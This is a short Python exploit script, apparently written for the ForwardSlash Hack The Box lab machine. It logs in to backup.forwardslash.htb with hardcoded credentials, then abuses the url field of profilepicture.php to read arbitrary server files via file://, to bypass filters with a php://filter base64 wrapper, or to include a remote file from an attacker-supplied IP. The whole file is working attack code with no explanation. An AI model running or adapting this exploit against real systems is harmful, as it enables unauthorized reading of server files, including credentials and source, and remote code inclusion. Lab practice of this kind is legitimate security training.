#!/usr/bin/python3

import requests
import sys
import argparse
from base64 import urlsafe_b64decode as b64

URL = "http://backup.forwardslash.htb/profilepicture.php"

parser = argparse.ArgumentParser(description="Exploit ForwardSlash LFI")
parser.add_argument('-R', metavar="<IP>", help='Choose RFI instead of LFI. Need IP address of hosted server on port 80' )
parser.add_argument('filename', help='Full path of desired file.')
parser.add_argument('-E',help='Use the php base64 filter to bypass restrictions', action="store_true")

args = parser.parse_args()

def get_encoded(filename):
	return "php://filter/convert.base64-encode/resource=" + filename

def get_rfi(host, filename):
	return "http://" + args.R + "/" + filename

def get_lfi(filename):
	return "file://" + filename

if args.E:
	DATA = {"url" : get_encoded(args.filename)}

elif args.R:
	DATA = {"url" : get_rfi(args.R, args.filename)}

else:
	DATA = {"url" : get_lfi(args.filename)}

session = requests.Session()
response = session.post(url="http://backup.forwardslash.htb/login.php", data={"username" : "pain", "password" : "password"})

contents = session.post(url=URL, cookies=response.cookies.get_dict(), data=DATA)
session.close()

if args.E:
	print(str(b64(contents.text[688:]),"utf-8"))
else:
	print(contents.text[688:])
